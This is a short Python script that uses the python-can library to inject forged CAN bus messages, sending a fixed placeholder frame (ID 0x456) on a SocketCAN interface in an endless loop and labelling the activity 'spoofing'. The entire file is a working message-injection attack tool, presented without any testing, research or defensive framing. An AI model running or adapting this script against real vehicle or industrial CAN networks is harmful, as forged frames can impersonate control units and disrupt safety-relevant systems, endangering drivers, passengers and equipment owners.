import can
import time

def spoof_can_data(interface, can_id, data):
    # Create a CAN interface
    bus = can.interface.Bus(channel=interface, bustype='socketcan')

    try:
        while True:
            # Create a CAN message
            msg = can.Message(arbitration_id=can_id, data=data, is_extended_id=False)

            # Send the CAN message
            bus.send(msg)

            print(f"Sent CAN message: {msg}")
            
            # Sleep for a short time before sending the next message
            time.sleep(0.5)

    except KeyboardInterrupt:
        print("Spoofing stopped.")
        bus.shutdown()

if __name__ == "__main__":
    # Specify the CAN interface (e.g., 'can0' for SocketCAN)
    can_interface = 'can0'
    
    # Specify the CAN ID for the spoofed messages
    spoofed_can_id = 0x456
    
    # Specify the data to be sent
    spoofed_data = [1, 1, 1, 1, 1]
    
    # Start CAN spoofing
    spoof_can_data(can_interface, spoofed_can_id, spoofed_data)
